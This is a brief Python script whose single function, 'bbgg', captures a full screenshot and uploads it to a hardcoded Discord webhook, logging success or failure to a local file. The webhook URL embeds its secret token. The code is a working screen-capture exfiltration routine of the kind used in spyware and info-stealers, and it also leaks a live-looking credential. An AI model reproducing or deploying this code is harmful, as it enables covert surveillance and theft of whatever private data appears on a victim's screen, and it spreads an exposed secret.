import logging
import io
import requests
from PIL import ImageGrab
from pathlib import Path

# Configure logging
log_file = Path(__file__).parent / 'bbgg.log'
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

def bbgg():
    """Capture a screenshot and send it to Discord with detailed logging."""
    webhook_url = "https://discord.com/api/webhooks/1280211760137371728/LULbt19qm60NFuSOFEiovIpvv9VHS8E7jkO2NC-v4I5tqItrKJqvJ2AJIOAmFNZjBmro"
    
    try:
        print("Starting screenshot capture")
        screenshot = ImageGrab.grab()
        with io.BytesIO() as image_data:
            screenshot.save(image_data, format='PNG')
            image_data.seek(0)  # Reset the file pointer to the beginning
            print("Preparing to send screenshot to Discord")
            
            # Send to Discord
            files = {
                'file': ('screenshot.png', image_data, 'image/png')
            }
            response = requests.post(webhook_url, files=files)
            response.raise_for_status()  # Raises an HTTPError for bad responses
            
            logging.info("Screenshot successfully sent to Discord.")
            print("Screenshot successfully sent to Discord.")
            
    except requests.exceptions.HTTPError as http_err:
        logging.error(f"HTTP error occurred: {http_err}")
        print(f"HTTP error occurred: {http_err}")
    except Exception as e:
        logging.error(f"An error occurred: {e}")
        print(f"An error occurred: {e}")

if __name__ == '__main__':
    bbgg()
